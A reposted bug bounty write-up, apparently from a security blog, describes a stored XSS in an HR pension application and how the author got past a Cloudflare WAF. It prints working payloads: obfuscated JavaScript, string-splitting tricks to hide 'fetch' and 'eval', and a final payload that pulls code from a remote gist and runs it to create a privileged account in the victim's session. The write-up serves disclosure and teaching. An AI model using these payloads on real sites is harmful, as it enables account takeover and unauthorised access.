# :globe_with_meridians: Bypassing WAF to Weaponize a Stored XSS

> **Original Source:** [Bypassing WAF to Weaponize a Stored XSS](https://infosecwriteups.com/bypassing-waf-to-weaponize-a-stored-xss-ff9963c421ee)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Bypassing WAF to Weaponize a Stored XSS


While testing a bug bounty program, I’ve noticed my `<u>html injection</u>` payload worked while spraying it to every field that is reflected in the application. Then, my first urge to get an alert with `<img src=x onerror=alert()>` had failed me. `Alert()` was blocked by cloudflare WAF. So, I used `console.log()` and it was accepted and executed. The problem occurred when I had to build a PoC that shows this XSS affects other users.

### About the Target


This application is built for HR departments to manage pensions of employees. Employees themselves don’t have access to the app. The only authorization difference happens between main-HR account and sub-HR accounts.


2 Permission levels exist for Sub-HR account.


```
1. Read-Only Access
2. Standard Access
```


A sub-HR account with standard access can create, edit, delete employee records. However, it can’t create new sub-HR accounts. Only main-HR account is allowed to do so.


So, In our attack scenario we have a sub-HR account. We’ll edit employee name to an XSS payload which will be stored. Our victim, a main-HR account visits the `Income Decl.` tab that results in execution of our payload. Which makes a `POST` request to `/hrusers/add` to create new sub-HR accounts.


Here is the page where XSS is executed. Information about the company is redacted by their request.


## Exploitation


`POST /hrusers/add` originally looked like this at its core(some headers are removed to increase readability):


```
POST /hrusers/add HTTP/1.1
Host: www.app.tld
Cookie: auth=secret;
Content-Length: 976
Origin: https://www.app.tld
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycItg8YvLxAC5Af6g
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.app.tld/
Connection: close------WebKitFormBoundarycItg8YvLxAC5Af6g
Content-Disposition: form-data; name="_method"POST
------WebKitFormBoundarycItg8YvLxAC5Af6g
Content-Disposition: form-data; name="data[User][first_name]"john
------WebKitFormBoundarycItg8YvLxAC5Af6g
Content-Disposition: form-data; name="data[User][last_name]"doe
------WebKitFormBoundarycItg8YvLxAC5Af6g
Content-Disposition: form-data; name="data[User][email_address]"ne555+blog@wearehackerone.com
------WebKitFormBoundarycItg8YvLxAC5Af6g
Content-Disposition: form-data; name="data[User][username]"ne555-blog
------WebKitFormBoundarycItg8YvLxAC5Af6g
Content-Disposition: form-data; name="data[User][password]"testpass123!
------WebKitFormBoundarycItg8YvLxAC5Af6g
Content-Disposition: form-data; name="data[User][conf_password]"testpass123!
------WebKitFormBoundarycItg8YvLxAC5Af6g
Content-Disposition: form-data; name="data[User][role_type]"0
------WebKitFormBoundarycItg8YvLxAC5Af6g--
```


`302 Found` is returned after a successful request.


- First thing I tried was using `script` tag but it was blocked by cloudflare.


2. I tried to bypass parsing however nothing good came out of it. So I needed to build the payload inside event handlers.


## Get Koru AI’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


3. I tried to create a `XMLHttpRequest`. However, it was blocked as well.
`<img src=x onerror="poc = new XMLHttpRequest()">`


4. After crafting couple of payloads, I realized this exploitation won’t be as easy as I thought. CSP rules allowed me to fetch data from any domain. So if I stored malicious javascript somewhere else and pull it in runtime, WAF wouldn’t be able to detect it.


5. `fetch()` was blocked. So I started searching a way to somehow encode it. I wanted to use [aurebesh.js](https://aem1k.com/aurebesh.js/) for a long time. This seems like a good usecase. Here is the full payload:


```
<img src=x onerror="a='',b=!a+a,aa=!b+a,ab=a+{},ba=b[a++],bb=b[baa=a],bab=++baa+a,aaa=ab[baa+bab],b[aaa+=ab[a]+(b.aa+ab)[a]+aa[bab]+ba+bb+b[baa]+aaa+ba+ab[a]+bb][aaa](aa[a]+aa[baa]+b[bab]+bb+ba+'(a)')()">
```


6. WAF didn’t block it and an alert popped. Maybe I could encode `fetch()` like this. I tried [jsfuck.com](http://www.jsfuck.com/) but WAF blocked my payload. This is strange. Maybe I could write my own version of [aurebesh.js](https://aem1k.com/aurebesh.js/) that lets me use any alphabet for any code.


7. After working on it for some time, it became clear my JS knowledge is way below the bar. I needed to find some other way to bypass this WAF.


8. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) repo was really helpful and I discovered `top["al"+"ert"](1);` payload actually worked. I could sneak in dangerous functions like this.


9. If I could turn `multipart/form-data` to `application/x-www-form-urlencoded` in `POST /hrusers/add` request, I wouldn’t have to deal with boundaries. I did that though Burp Suite’s `change body encoding` feature and server accepted the request.


10. I created a gist with the code below.


```
body = `_method=POST&data%5bUser%5d%5bfirst_name%5d=john&data%5bUser%5d%5blast_name%5d=doe&data%5bUser%5d%5bemail_address%5d=ne555%2bblog@wearehackerone.com&data%5bUser%5d%5busername%5d=ne555-blog&data%5bUser%5d%5bpassword%5d=testpass123%21&data%5bUser%5d%5bconf_password%5d=testpass123%21&data%5bUser%5d%5brole_type%5d=0`;
poc = new XMLHttpRequest();
poc.open(`POST`,`/hrusers/add`, true);
poc.setRequestHeader(`Content-Type`, `application/x-www-form-urlencoded`);
poc.withCredentials = true;
poc.send(body);
```


11. Now I had to fetch this javascript and execute it using `eval()`. Payload creation was problematic thanks to it being inside of an event handler and consisted of many layers. All the strings inside the gist had to be created using apostrophe.


12. The Final payload:


```
<img src="x" onerror="top[`fet`+`ch`]('https://gist.githubusercontent.com/Hubbey/84d413e76dd833b42eb0281b9d7191fa/raw/e08425e18d85b10e82dc6ba4bc25b0df08321000/blog').then(response =>response.text()).then((body) =>{top[`ev`+`al`](body);})">
```


13. Now, when the victim vists the page, a new sub-HR account is created.

### Conclusion


Going beyond proving an XSS is working turned out to be really educating. This vulnerability was in a private bug bounty program. So, it was rewarded and this blog post was allowed by the company.

---

*Originally published on [Medium](https://infosecwriteups.com/bypassing-waf-to-weaponize-a-stored-xss-ff9963c421ee). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
